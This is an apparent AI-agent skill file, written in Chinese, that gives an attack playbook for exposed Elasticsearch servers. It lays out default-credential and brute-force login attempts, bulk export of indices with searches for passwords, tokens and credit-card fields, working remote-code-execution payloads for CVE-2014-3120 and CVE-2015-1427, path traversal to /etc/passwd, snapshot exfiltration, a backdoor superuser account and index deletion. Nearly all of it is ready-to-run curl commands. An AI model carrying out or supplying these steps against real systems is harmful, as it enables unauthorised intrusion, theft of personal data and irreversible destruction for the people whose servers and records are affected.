---
name: elasticsearch-attack
description: "Elasticsearch 未授权访问与利用。当发现目标开放 9200/9300 端口、Elasticsearch 服务无认证、需要从 ES 获取索引数据或实现远程命令执行时使用。覆盖未授权访问、认证绕过、索引数据窃取、MVEL/Groovy 脚本 RCE（旧版本）、快照仓库滥用、集群信息泄露、动态脚本注入、Ingest Pipeline 滥用、路径穿越"
metadata:
  tags: "elasticsearch,es,9200,9300,未授权,rce,groovy,mvel,snapshot,ingest-pipeline,kibana,索引"
  category: "exploit"
---

# Elasticsearch 未授权访问与利用

Elasticsearch 默认监听 9200 端口且无认证保护，暴露在网络上时面临大量敏感数据泄露和潜在的 RCE 风险。

## ⛔ 深入参考（必读）
- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现与版本识别

### 1.1 基础探测

```bash
# 直接请求根路径，返回集群名称和版本号
curl http://TARGET:9200/

# 集群健康状态
curl http://TARGET:9200/_cat/health?v
curl http://TARGET:9200/_cluster/health?pretty
```

### 1.2 Nmap 扫描

```bash
# HTTP 服务识别
nmap -sV -p 9200,9300 TARGET

# 通用 HTTP 指纹脚本；ES 细节枚举优先使用后续 curl API
nmap -p 9200 --script http-title,http-headers TARGET
```

**关键判断**：
- 返回 JSON 含 `cluster_name` / `version.number` → 无认证，直接进入 Phase 3
- 返回 401 / 403 → 有认证，进入 Phase 2
- `version.number` < 1.2 → MVEL RCE 可用（CVE-2014-3120）
- `version.number` 1.3.x - 1.4.x → Groovy 沙箱逃逸 RCE 可用（CVE-2015-1427）
- `version.number` >= 5.x → 关注 Painless 脚本和 Ingest Pipeline

---

## Phase 2: 未授权/认证绕过检测

### 2.1 无认证确认

```bash
# 直接访问核心 API 端点
curl http://TARGET:9200/_cat/indices?v
curl http://TARGET:9200/_cluster/state?pretty
curl http://TARGET:9200/_nodes/stats?pretty
```

### 2.2 默认凭证与 X-Pack

```bash
# 常见默认凭证: elastic:changeme, elastic:elastic, admin:admin
curl -u elastic:changeme http://TARGET:9200/
curl -u elastic:elastic http://TARGET:9200/
curl -u admin:admin http://TARGET:9200/

# 检查 X-Pack Security 是否启用
curl http://TARGET:9200/_xpack/security/user
curl http://TARGET:9200/_security/user

# 暴力破解
hydra -L users.txt -P passwords.txt TARGET http-get /_search
```

---

## Phase 3: 攻击决策树

```
连接成功？
├─ ES < 1.2 → MVEL RCE (/_search + script filter, CVE-2014-3120)
├─ ES 1.3.x-1.4.x → Groovy 沙箱逃逸 RCE (CVE-2015-1427)
├─ ES < 1.4.3 + _plugin → 路径穿越读文件
├─ ES >= 6.x + 无认证 → 索引数据批量导出
│   ├─ _cat/indices 列出所有索引
│   ├─ _search + _scroll 批量导出
│   └─ 搜索敏感字段 (password, token, email, credit_card)
├─ 有快照仓库权限 → 快照数据窃取/恢复
├─ 有 Ingest Pipeline 权限 → Pipeline 注入（数据修改）
├─ 有动态脚本权限 → 脚本存储与执行
├─ Kibana 暴露 → Kibana 控制台利用
└─ 有集群管理权限 → 配置篡改 / 恶意用户创建
```

**前置信息收集**：

```bash
# 获取版本号（决定攻击路径）
curl -s http://TARGET:9200/ | grep number

# 列出所有索引（判断数据规模）
curl http://TARGET:9200/_cat/indices?v

# 获取集群设置
curl http://TARGET:9200/_cluster/settings?pretty

# 获取所有索引映射（了解数据结构）
curl http://TARGET:9200/_all/_mapping?pretty
```

---

## Phase 4: 数据窃取速查

### 4.1 索引枚举

```bash
# 列出所有索引
curl http://TARGET:9200/_cat/indices?v

# 列出所有别名
curl http://TARGET:9200/_aliases?pretty

# 获取索引映射（字段结构）
curl http://TARGET:9200/INDEX_NAME/_mapping?pretty
```

### 4.2 数据搜索与导出

```bash
# 搜索所有数据（默认返回 10 条）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 1000
  }'

# 搜索敏感字段
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "multi_match": {
        "query": "password",
        "fields": ["*"]
      }
    }
  }'
```

### 4.3 大量数据用 _scroll API

```bash
# 初始化 scroll
curl -X POST http://TARGET:9200/INDEX_NAME/_search?scroll=5m \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 5000
  }'

# 持续获取（使用上一步返回的 _scroll_id）
curl -X POST http://TARGET:9200/_search/scroll \
  -H 'Content-Type: application/json' -d '{
    "scroll": "5m",
    "scroll_id": "SCROLL_ID_HERE"
  }'
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取 elasticdump 批量导出命令

---

## Phase 5: RCE 速查

### 5.1 MVEL 表达式注入 (ES < 1.2, CVE-2014-3120)

```bash
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "query": {"match_all": {}},
        "filter": {
          "script": {
            "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.Class.forName(\"java.lang.String\")).invoke(null,\"id\")"
          }
        }
      }
    }
  }'
```

### 5.2 Groovy 沙箱逃逸 (ES 1.3.x-1.4.x, CVE-2015-1427)

```bash
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script": "def proc = \"id\".execute(); proc.waitFor(); proc.text()"
          }
        }
      }
    }
  }'
```

### 5.3 路径穿越 (ES < 1.4.3)

```bash
curl http://TARGET:9200/_plugin/head/../../../../../../etc/passwd
curl http://TARGET:9200/_plugin/head/../../../../../../etc/elasticsearch/elasticsearch.yml
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 RCE payload

---

## Phase 6: 其他攻击向量

### 6.1 快照仓库滥用

```bash
# 注册快照仓库
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo \
  -H 'Content-Type: application/json' -d '{
    "type": "fs",
    "settings": {"location": "/tmp/snapshots"}
  }'

# 创建快照
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo/snap_1

# 恢复快照到攻击者可达路径
curl -X POST http://TARGET:9200/_snapshot/exfil_repo/snap_1/_restore
```

### 6.2 Ingest Pipeline 注入

```bash
# 列出现有 Pipeline
curl http://TARGET:9200/_ingest/pipeline?pretty

# 创建恶意 Pipeline
curl -X PUT http://TARGET:9200/_ingest/pipeline/malicious \
  -H 'Content-Type: application/json' -d '{
    "description": "data interceptor",
    "processors": [
      {"set": {"field": "intercepted", "value": "true"}}
    ]
  }'
```

### 6.3 集群配置篡改

```bash
# 创建后门用户（需 X-Pack 管理权限）
curl -X POST http://TARGET:9200/_xpack/security/user/attacker \
  -H 'Content-Type: application/json' -d '{
    "password": "password123",
    "roles": ["superuser"]
  }'

# 删除索引
curl -X DELETE http://TARGET:9200/INDEX_NAME
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整技术细节

---

## 工具速查

| 工具 | 用途 |
|------|------|
| curl | ES REST API 交互（所有操作的基础） |
| elasticsearch-head | 集群管理 Web UI 插件 |
| Kibana | ES 数据可视化和 Dev Tools 查询 |
| elasticdump | 索引数据批量导出/导入 |
| nmap | 端口扫描、服务识别和通用 HTTP 指纹脚本 |
| hydra | HTTP 认证暴力破解 |

---

## 注意事项

- ES 操作全部通过 REST API（HTTP），所有命令使用 curl
- `_scroll` API 对大量数据导出比 `_search` 更高效，避免一次性拉取全部数据
- 旧版本 RCE：MVEL 在 ES < 1.2 有效，Groovy 沙箱逃逸在 ES 1.3.x-1.4.x 有效，现代版本已移除
- `_search?size=10000` 有上限限制，超过需使用 `_scroll` 或 `search_after`
- 删除索引 (`DELETE /index`) 不可逆，操作前确认目标
- 生产环境避免对大索引执行 `match_all` 全量查询，优先分批导出
